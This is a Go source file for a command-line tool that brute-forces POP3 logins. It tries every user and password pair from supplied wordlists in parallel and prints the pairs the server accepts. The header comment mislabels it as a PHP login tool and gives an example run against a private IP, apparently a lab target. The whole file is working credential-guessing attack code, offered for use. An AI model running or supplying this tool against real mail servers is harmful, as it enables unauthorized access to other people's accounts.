package main

/*
	Simple tool to brute force a PHP login like hydra.
	Works a lot faster than hydra, and doesn't disconnnect with -ERR after a timeout.
	Example usage:
		go run go-pop3.go -host 10.10.128.2:55007 -L users.txt  -P ../wordlists/fasttrack.txt
*/

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
)

var (
	host         = flag.String("host", "localhost", "Host")
	login        = flag.String("l", "", "Login")
	loginList    = flag.String("L", "", "Login List")
	password     = flag.String("p", "", "Password")
	passwordList = flag.String("P", "", "Password List")
)

func main() {
	flag.Parse()

	logins := []string{*login}
	if *login == "" {
		logins = readLinesFromFile(*loginList)
	}

	passwords := []string{*password}
	if *password == "" {
		passwords = readLinesFromFile(*passwordList)
	}

	results := make(chan string)

	total := 0
	for _, l := range logins {
		for _, p := range passwords {
			total++
			go testPop3Login(*host, l, p, results)
		}
	}

	fmt.Printf("testing %d combinations...\n", total)

	count := 0
	for result := range results {
		count++
		if strings.Contains(result, "+OK") {
			fmt.Println(result)
		}
		if count == total {
			fmt.Println("finished")
			return
		}
	}
}

func testPop3Login(address, login, password string, results chan<- string) {
	conn, err := net.Dial("tcp", *host)
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	message, err := readFromConn(conn)
	if err != nil {
		log.Fatal(err)
	}

	_, err = writeToConn(conn, "USER "+login+"\n")
	if err != nil {
		log.Fatal(err)
	}

	message, err = readFromConn(conn)
	if err != nil {
		log.Fatal(err)
	}

	_, err = writeToConn(conn, "PASS "+password+"\n")
	if err != nil {
		log.Fatal(err)
	}

	message, err = readFromConn(conn)
	if err != nil {
		log.Fatal(err)
	}

	results <- fmt.Sprintf("%s:%s = %s", login, password, message)
}

func readLinesFromFile(filename string) (results []string) {
	file, err := os.Open(filename)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	results = []string{}
	for scanner.Scan() {
		results = append(results, scanner.Text())
	}
	return results
}

func readFromConn(conn net.Conn) (string, error) {
	reader := bufio.NewReader(conn)
	var buffer bytes.Buffer
	for {
		ba, isPrefix, err := reader.ReadLine()
		if err != nil {
			if err == io.EOF {
				break
			}
			return "", err
		}
		buffer.Write(ba)
		if !isPrefix {
			break
		}
	}
	return buffer.String(), nil
}

func writeToConn(conn net.Conn, content string) (int, error) {
	writer := bufio.NewWriter(conn)
	number, err := writer.WriteString(content)
	if err == nil {
		err = writer.Flush()
	}
	return number, err
}
